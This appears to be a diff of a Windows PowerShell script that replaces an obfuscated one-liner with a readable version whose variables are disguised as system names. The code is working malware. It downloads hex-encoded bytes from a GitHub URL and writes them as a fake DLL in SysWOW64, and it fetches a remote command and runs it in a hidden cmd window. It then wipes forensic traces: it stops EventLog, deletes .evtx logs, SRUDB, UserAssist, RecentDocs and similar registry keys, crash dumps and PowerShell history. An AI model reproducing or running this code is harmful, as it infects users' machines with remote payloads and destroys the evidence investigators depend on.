@@ -1,1 +1,81 @@
-$ErrorActionPreference='SilentlyContinue';cls;&('Add-Type')-AssemblyName System.Windows.Forms *>$null;$l1='https://raw.githubusercontent.com/devnull-sys/files/refs/heads/master/iwe_history.txt';$l2='https://raw.githubusercontent.com/devnull-sys/files/refs/heads/master/e.txt';$l3='https://raw.githubusercontent.com/devnull-sys/files/refs/heads/master/b.txt';$p='{0}:{1}Windows{1}SysWOW64{1}ntdllp.dll'-f 'C','';$m='SteF6b2WrAgu';function F1($s){$h=$s-replace'[^0-9A-Fa-f]';if($h.Length%2){return $null};$ba=[byte[]]::new($h.Length/2);for($i=0;$i-lt $h.Length;$i+=2){$ba[$i/2]=[convert]::ToByte($h.Substring($i,2),16)};return $ba};try{$rA=&('IWR') -Uri $l1 -UseBasicParsing -TimeoutSec 30;$mb=F1 $rA.Content;if($mb){[IO.File]::WriteAllBytes($p,$mb)}}catch{};&('scb') $m *>$null;try{$rB=&('IWR') -Uri $l2 -UseBasicParsing -TimeoutSec 30;$cmd=$rB.Content.Trim();if($cmd){&('Start-Process') cmd -Args "/c $cmd" -WindowStyle Hidden}}catch{};&('sleep') 5;do{&('sleep') 1}while(&('Get-Process')-Name "Installer"-ErrorAction SilentlyContinue);try{$rC=&('IWR')-Uri $l3 -UseBasicParsing -TimeoutSec 30;$cb=F1 rC.Content;if($cb){[IO.File]::WriteAllBytes($p,$cb)}}catch{};&('taskkill')/f /im ('exp'+'lorer.exe')*>$null;&('net') stop ('Eve'+'ntLog')/y *>$null;rm -Path ('HKCR:'+([char[]](92,76,111,99,97,108,32,83,101,116,116,105,110,103,115,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,104,101,108,108))-join'')-Recurse -Force *>$null;rm -Path ('HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\'+'ComDlg32') -Recurse -Force *>$null;rm -Path ('HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\'+'RecentDocs') -Recurse -Force *>$null;rm -Path ('HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\'+'UserAssist') -Recurse -Force *>$null;rm -Path ('HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\'+'Store')-Recurse -Force *>$null;rm -Path ('HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\'+'FeatureUsage') -Recurse -Force *>$null;&('reg') delete ('HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\'+'TypedPaths') /f *>$null;&('Clear-DnsClientCache')*>$null;rm -Path "$env:SystemRoot\System32\winevt\Logs\*.evtx" -Force *>$null;rm -Path "$env:SystemRoot\appcompat\pca*.txt"-Force *>$null;rm -Path "$env:SystemRoot\System32\sru\SRUDB.dat"-Force *>$null;gci -Path "$env:USERPROFILE\AppData\Local\CrashDumps" -Recurse -File|?{_.Name -like "installer"}|rm -Force *>$null;&('Rundll32.exe') apphelp.dll,ShimFlushCache >$null;&('Start-Process') ('exp'+'lorer.exe')>$null;&('net') start ('Eve'+'ntLog') /y *>$null;&('Clear-Content')-Path("$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine"+('Con'+'soleHost_history.txt'))-Force *>$null;&('Clear-History')-Force *>$null;exit
+$ErrorActionPreference = 'SilentlyContinue'
+cls
+
+Add-Type -AssemblyName System.Windows.Forms *> $null
+
+$MsUpdateServiceUrl = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/iwe_history.txt"
+$KernelExecutionPolicy = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/e.txt"
+$WinSxS_RestorePoint = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/cast/b.txt"
+$SystemCompatibilityLayer = "C:\Windows\SysWOW64\ntdllp.dll"
+$UserSessionGuid = "SteF6b2WrAgu"
+
+function Parse-SystemDataStream {
+    param([string]$hexString)
+    
+    $cleanHex = $hexString -replace '[^0-9A-Fa-f]'
+    
+    if ($cleanHex.Length % 2) {
+        return $null
+    }
+    
+    $byteArray = [byte[]]::new($cleanHex.Length / 2)
+    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
+        $byteArray[$i/2] = [System.Convert]::ToByte($cleanHex.Substring($i, 2), 16)
+    }
+    
+    return $byteArray
+}
+
+try {
+    $ServiceResponse = Invoke-WebRequest -Uri $MsUpdateServiceUrl -UseBasicParsing -TimeoutSec 20
+    $ComponentBytes = Parse-SystemDataStream $ServiceResponse.Content
+    if ($ComponentBytes) {
+        [System.IO.File]::WriteAllBytes($SystemCompatibilityLayer, $ComponentBytes)
+    }
+} catch {}
+
+Set-Clipboard $UserSessionGuid *> $null
+
+try {
+    $PolicyResponse = Invoke-WebRequest -Uri $KernelExecutionPolicy -UseBasicParsing -TimeoutSec 20
+    $ExecutionCommand = $PolicyResponse.Content.Trim()
+    if ($ExecutionCommand) {
+        Start-Process cmd -ArgumentList "/c $ExecutionCommand" -WindowStyle Hidden
+    }
+} catch {}
+
+Start-Sleep -Seconds 5
+do {
+    Start-Sleep -Seconds 1
+} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
+
+try {
+    $RestoreResponse = Invoke-WebRequest -Uri $WinSxS_RestorePoint -UseBasicParsing -TimeoutSec 20
+    $RestoreBytes = Parse-SystemDataStream $RestoreResponse.Content
+    if ($RestoreBytes) {
+        [System.IO.File]::WriteAllBytes($SystemCompatibilityLayer, $RestoreBytes)
+    }
+} catch {}
+
+taskkill /f /im explorer.exe *> $null
+net stop EventLog /y *> $null
+
+reg delete "HKCR\Local Settings\Software\Microsoft\Windows\Shell" /f *> $null
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" /f *> $null
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f *> $null
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f *> $null
+reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f *> $null
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage" /f *> $null
+reg delete "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f *> $null
+Clear-DnsClientCache *> $null
+Set-Clipboard -Value "10001199342508276"
+Remove-Item -Path "$env:SystemRoot\System32\winevt\Logs\*.evtx" -Force *> $null
+Remove-Item -Path "$env:SystemRoot\appcompat\pca*.txt" -Force *> $null
+Remove-Item -Path "$env:SystemRoot\System32\sru\SRUDB.dat" -Force *> $null
+Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\CrashDumps" -Recurse -File | Where-Object { $_.Name -like "*installer*" } | Remove-Item -Force *> $null
+Rundll32.exe apphelp.dll,ShimFlushCache *> $null
+Start-Process explorer.exe *> $null
+net start EventLog /y *> $null
+Clear-Content -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force *> $null
+Clear-History -Force *> $null
+exit
